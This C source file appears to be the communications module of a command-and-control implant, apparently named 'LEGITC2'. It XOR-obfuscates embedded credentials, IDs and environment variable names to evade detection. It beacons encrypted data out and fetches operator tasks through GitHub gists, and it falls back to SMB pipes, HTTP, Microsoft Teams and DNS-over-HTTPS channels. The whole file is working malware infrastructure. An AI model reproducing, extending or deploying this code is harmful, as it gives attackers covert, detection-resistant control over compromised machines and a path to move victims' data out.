#include "channels.h"
#include "agent_config.h"
#include "crypto.h"
#include "util.h"
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef CURLSSLOPT_NATIVE_CA
#define CURLSSLOPT_NATIVE_CA (1<<4)
#endif

/* decode a XOR-obfuscated config value */
static void cfg_decode(const unsigned char *src, size_t len, char *dst)
{
    for (size_t i = 0; i < len; i++)
        dst[i] = (char)(src[i] ^ CFG_XOR_KEY[i % CFG_XOR_KEY_LEN]);
    dst[len] = '\0';
}

/* accumulates HTTP response data */

typedef struct {
    char  *data;
    size_t len;
} curl_buf_t;

static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    curl_buf_t *buf = (curl_buf_t *)userdata;
    size_t      new_bytes = size * nmemb;
    char       *tmp = realloc(buf->data, buf->len + new_bytes + 1);
    if (!tmp) return 0;
    buf->data = tmp;
    memcpy(buf->data + buf->len, ptr, new_bytes);
    buf->len += new_bytes;
    buf->data[buf->len] = '\0';
    return new_bytes;
}

/* HTTPS request to the GitHub API, GET or PATCH */

typedef enum { HTTP_GET, HTTP_PATCH } http_method_t;

static char *github_request(const char *token, const char *url,
                             http_method_t method, const char *body_json)
{
    CURL      *curl = curl_easy_init();
    if (!curl) return NULL;

    curl_buf_t resp = {0};

    struct curl_slist *hdrs = NULL;
    char auth_hdr[320];
    char ua_hdr[320];
    snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: token %s", token);
    snprintf(ua_hdr,   sizeof(ua_hdr),   "User-Agent: %s", random_ua());
    hdrs = curl_slist_append(hdrs, auth_hdr);
    hdrs = curl_slist_append(hdrs, "Accept: application/vnd.github+json");
    hdrs = curl_slist_append(hdrs, "Content-Type: application/json");
    hdrs = curl_slist_append(hdrs, ua_hdr);
    hdrs = curl_slist_append(hdrs, "X-GitHub-Api-Version: 2022-11-28");

    curl_apply_opsec(curl);
    curl_easy_setopt(curl, CURLOPT_URL,           url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER,    hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA,     &resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,       30L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    if (method == HTTP_PATCH) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PATCH");
        if (body_json) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body_json);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(body_json));
        }
    }

    CURLcode res = curl_easy_perform(curl);
    long     http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || (http_code < 200 || http_code >= 300)) {
        free(resp.data);
        return NULL;
    }
    return resp.data;
}

/* extract the "content" field for filename from a gist JSON response */

static char *gist_extract_content(const char *response, const char *filename)
{
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", filename);
    const char *p = strstr(response, needle);
    if (!p) return NULL;

    /* find content field after the filename key */
    p = strstr(p, "\"content\"");
    if (!p) return NULL;
    p += strlen("\"content\"");
    while (*p == ' ' || *p == ':' || *p == ' ') p++;
    if (*p != '"') return NULL;
    p++;

    /* read until closing quote */
    size_t cap = 1024, len = 0;
    char *out = malloc(cap);
    if (!out) return NULL;

    while (*p && *p != '"') {
        if (len + 4 >= cap) {
            cap *= 2;
            char *tmp = realloc(out, cap);
            if (!tmp) { free(out); return NULL; }
            out = tmp;
        }
        if (*p == '\\' && *(p+1)) {
            p++; /* skip backslash */
            switch (*p) {
            case 'n':  out[len++] = '\n'; break;
            case 'r':  out[len++] = '\r'; break;
            case 't':  out[len++] = '\t'; break;
            default:   out[len++] = *p;   break;
            }
        } else {
            out[len++] = *p;
        }
        p++;
    }
    out[len] = '\0';

    /* nothing to return */
    if (len == 0 || strcmp(out, "null") == 0) {
        free(out);
        return NULL;
    }
    return out;
}

/* init config: compiled XOR values first, then env var overrides */
void channel_config_init(channel_config_t *cfg)
{
    memset(cfg, 0, sizeof(*cfg));

    /* decode compiled-in values */
    if (CFG_GITHUB_TOKEN_LEN)
        cfg_decode(CFG_GITHUB_TOKEN,  CFG_GITHUB_TOKEN_LEN,  cfg->github_token);
    if (CFG_GIST_CMD_ID_LEN)
        cfg_decode(CFG_GIST_CMD_ID,   CFG_GIST_CMD_ID_LEN,   cfg->gist_cmd_id);
    if (CFG_GIST_OUT_ID_LEN)
        cfg_decode(CFG_GIST_OUT_ID,   CFG_GIST_OUT_ID_LEN,   cfg->gist_out_id);
    if (CFG_TEAMS_TENANT_LEN)
        cfg_decode(CFG_TEAMS_TENANT,  CFG_TEAMS_TENANT_LEN,  cfg->teams_tenant_id);
    if (CFG_TEAMS_CLIENT_LEN)
        cfg_decode(CFG_TEAMS_CLIENT,  CFG_TEAMS_CLIENT_LEN,  cfg->teams_client_id);
    if (CFG_TEAMS_SECRET_LEN)
        cfg_decode(CFG_TEAMS_SECRET,  CFG_TEAMS_SECRET_LEN,  cfg->teams_client_secret);
    if (CFG_TEAMS_WEBHOOK_LEN)
        cfg_decode(CFG_TEAMS_WEBHOOK,   CFG_TEAMS_WEBHOOK_LEN,   cfg->teams_webhook_url);
    if (CFG_TEAMS_TEAM_ID_LEN)
        cfg_decode(CFG_TEAMS_TEAM_ID,   CFG_TEAMS_TEAM_ID_LEN,   cfg->teams_team_id);
    if (CFG_TEAMS_CHANNEL_LEN)
        cfg_decode(CFG_TEAMS_CHANNEL,   CFG_TEAMS_CHANNEL_LEN,   cfg->teams_channel_id);
    if (CFG_BEACON_URL_LEN)
        cfg_decode(CFG_BEACON_URL,    CFG_BEACON_URL_LEN,    cfg->beacon_url);
    if (CFG_DOH_DOMAIN_LEN)
        cfg_decode(CFG_DOH_DOMAIN,    CFG_DOH_DOMAIN_LEN,    cfg->doh_domain);
#if defined(CFG_SMB_HOST_LEN) && CFG_SMB_HOST_LEN > 0
    cfg_decode(CFG_SMB_HOST, CFG_SMB_HOST_LEN, cfg->smb_host);
#endif
#if defined(CFG_SMB_PIPE_LEN) && CFG_SMB_PIPE_LEN > 0
    cfg_decode(CFG_SMB_PIPE, CFG_SMB_PIPE_LEN, cfg->smb_pipe);
#endif

    strncpy(cfg->doh_server,
            "https://cloudflare-dns.com/dns-query",
            sizeof(cfg->doh_server) - 1);

    /* env var overrides for dev/test — names are XOR'd to avoid plaintext strings */
#define ENV_XOR 0xa5

    /* XOR-encoded env var names */
    static const unsigned char k_env_gh_token[]     = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xe2,0xec,0xf1,0xed,0xf0,0xe7,0xfa,0xf1,0xea,0xee,0xe0,0xeb};
    static const unsigned char k_env_gist_cmd[]     = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xe2,0xec,0xf6,0xf1,0xfa,0xe6,0xe8,0xe1};
    static const unsigned char k_env_gist_out[]     = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xe2,0xec,0xf6,0xf1,0xfa,0xea,0xf0,0xf1};
    static const unsigned char k_env_teams_tenant[] = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf1,0xe0,0xe4,0xe8,0xf6,0xfa,0xf1,0xe0,0xeb,0xe4,0xeb,0xf1};
    static const unsigned char k_env_teams_client[] = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf1,0xe0,0xe4,0xe8,0xf6,0xfa,0xe6,0xe9,0xec,0xe0,0xeb,0xf1};
    static const unsigned char k_env_teams_secret[] = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf1,0xe0,0xe4,0xe8,0xf6,0xfa,0xf6,0xe0,0xe6,0xf7,0xe0,0xf1};
    static const unsigned char k_env_teams_wh[]     = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf1,0xe0,0xe4,0xe8,0xf6,0xfa,0xf2,0xe0,0xe7,0xed,0xea,0xea,0xee};
    static const unsigned char k_env_teams_team[]   = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf1,0xe0,0xe4,0xe8,0xf6,0xfa,0xf1,0xe0,0xe4,0xe8};
    static const unsigned char k_env_teams_chan[]   = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf1,0xe0,0xe4,0xe8,0xf6,0xfa,0xe6,0xed,0xe4,0xeb,0xeb,0xe0,0xe9};
    static const unsigned char k_env_beacon_url[]   = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xe7,0xe0,0xe4,0xe6,0xea,0xeb,0xfa,0xf0,0xf7,0xe9};
    static const unsigned char k_env_doh_server[]   = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xe1,0xea,0xed,0xfa,0xf6,0xe0,0xf7,0xf3,0xe0,0xf7};
    static const unsigned char k_env_doh_domain[]   = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xe1,0xea,0xed,0xfa,0xe1,0xea,0xe8,0xe4,0xec,0xeb};
    /* LEGITC2_SMB_HOST */
    static const unsigned char k_env_smb_host[]    = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf6,0xe8,0xe7,0xfa,0xed,0xea,0xf6,0xf1};
    /* LEGITC2_SMB_PIPE */
    static const unsigned char k_env_smb_pipe[]    = {0xe9,0xe0,0xe2,0xec,0xf1,0xe6,0x97,0xfa,0xf6,0xe8,0xe7,0xfa,0xf5,0xec,0xf5,0xe0};

#define OVERRIDE(enc_key, field) do { \
        char _kb[64] = {0}; \
        volatile unsigned char _x = ENV_XOR; \
        for (size_t _i = 0; _i < sizeof(enc_key); _i++) \
            _kb[_i] = (char)(enc_key[_i] ^ _x); \
        const char *_v = getenv(_kb); \
        if (_v) strncpy(cfg->field, _v, sizeof(cfg->field) - 1); \
        memset(_kb, 0, sizeof(_kb)); \
    } while (0)

    OVERRIDE(k_env_gh_token,     github_token);
    OVERRIDE(k_env_gist_cmd,     gist_cmd_id);
    OVERRIDE(k_env_gist_out,     gist_out_id);
    OVERRIDE(k_env_teams_tenant, teams_tenant_id);
    OVERRIDE(k_env_teams_client, teams_client_id);
    OVERRIDE(k_env_teams_secret, teams_client_secret);
    OVERRIDE(k_env_teams_wh,     teams_webhook_url);
    OVERRIDE(k_env_teams_team,   teams_team_id);
    OVERRIDE(k_env_teams_chan,   teams_channel_id);
    OVERRIDE(k_env_beacon_url,   beacon_url);
    OVERRIDE(k_env_doh_server,   doh_server);
    OVERRIDE(k_env_doh_domain,   doh_domain);
    OVERRIDE(k_env_smb_host,     smb_host);
    OVERRIDE(k_env_smb_pipe,     smb_pipe);
#undef OVERRIDE
#undef ENV_XOR
}

/* upload encrypted b64 beacon to the output gist */
int github_send(const channel_config_t *cfg, const char *agent_id, const char *b64)
{
    if (!cfg->github_token[0] || !cfg->gist_out_id[0]) return CHANNEL_ERR;

    char url[256];
    snprintf(url, sizeof(url),
             "https://api.github.com/gists/%s", cfg->gist_out_id);

    /* build PATCH JSON body */
    size_t body_sz = strlen(b64) + 128;
    char  *body    = malloc(body_sz);
    if (!body) return CHANNEL_ERR;

    snprintf(body, body_sz,
             "{\"files\":{\"%s_1x.bin\":{\"content\":\"%s\"}}}",
             agent_id, b64);

    char *resp = github_request(cfg->github_token, url, HTTP_PATCH, body);
    free(body);

    if (!resp) return CHANNEL_ERR;
    free(resp);
    return CHANNEL_OK;
}

/* fetch pending task from the command gist, NULL if nothing */
char *github_recv(const channel_config_t *cfg, const char *agent_id)
{
    if (!cfg->github_token[0] || !cfg->gist_cmd_id[0]) return NULL;

    char url[256];
    snprintf(url, sizeof(url),
             "https://api.github.com/gists/%s", cfg->gist_cmd_id);

    char *resp = github_request(cfg->github_token, url, HTTP_GET, NULL);
    if (!resp) return NULL;

    char filename[64];
    snprintf(filename, sizeof(filename), "%s_0x.bin", agent_id);
    char *content = gist_extract_content(resp, filename);
    free(resp);

    return content;
}

/* try channels in priority order */

int channel_send(const channel_config_t *cfg, const char *agent_id, const char *b64)
{
    if (cfg->smb_host[0] && smb_send(cfg, agent_id, b64) == CHANNEL_OK) return CHANNEL_OK;
    if (github_send(cfg, agent_id, b64) == CHANNEL_OK) return CHANNEL_OK;
    if (cfg->beacon_url[0] && http_send(cfg, agent_id, b64) == CHANNEL_OK) return CHANNEL_OK;
    if (cfg->teams_tenant_id[0] && teams_send(cfg, agent_id, b64) == CHANNEL_OK) return CHANNEL_OK;
    return doh_send(cfg, agent_id, b64);
}

char *channel_recv(const channel_config_t *cfg, const char *agent_id)
{
    char *result;

    if (cfg->smb_host[0]) { result = smb_recv(); if (result) return result; }
    result = github_recv(cfg, agent_id); if (result) return result;
    result = http_recv(); if (result) return result;
    if (cfg->teams_tenant_id[0]) { result = teams_recv(cfg, agent_id); if (result) return result; }
    return doh_recv(cfg, agent_id);
}
